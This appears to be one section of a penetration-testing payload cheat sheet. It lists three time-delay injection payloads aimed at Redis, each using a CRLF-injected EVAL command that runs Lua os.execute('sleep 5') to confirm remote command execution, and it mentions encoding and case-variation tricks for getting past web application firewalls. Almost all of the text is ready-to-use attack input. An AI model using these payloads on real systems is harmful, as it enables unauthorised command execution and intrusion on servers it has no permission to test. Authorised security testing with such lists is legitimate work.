# Redis

These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.

- **\r\nEVAL "os.execute('sleep 5')" 0**  
  Standard Lua OS sleep.
- **\r\nEVAL "redis.call('ping'); os.execute('sleep 5')" 0**  
  Ping + sleep.
- **\r\neVaL "Os.ExEcUtE('sLeEp 5')" 0**  
  Case variation Lua.
